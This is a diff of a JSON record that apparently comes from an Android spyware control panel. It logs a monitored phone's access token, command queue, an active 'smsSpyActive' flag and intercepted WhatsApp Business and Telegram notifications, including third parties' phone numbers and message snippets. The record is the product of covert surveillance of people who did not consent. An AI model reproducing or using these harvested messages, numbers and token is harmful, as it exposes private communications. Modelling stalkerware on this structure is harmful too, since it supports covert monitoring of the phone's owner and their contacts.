@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636885338,
+    "lastSeen": 1775636888424,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "🗿",
+        "time": "08/04 15:28",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636888525
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636886781
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636886762
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "12 new messages from 11 chats",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636886680
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636886631
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
+        "content": "Voice message",
+        "time": "08/04 15:28",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636886617
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -4278,54 +4326,6 @@
         "time": "08/04 14:34",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633696657
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎14 pesan dari 3 chat",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633696649
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "P",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633696637
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "taruu di gb ajaaa",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633696526
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Mbut",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633684423
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎20 pesan dari 3 chat",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633684413
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "P",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633684391
       }
     ],
     "galleryPhotos": [],
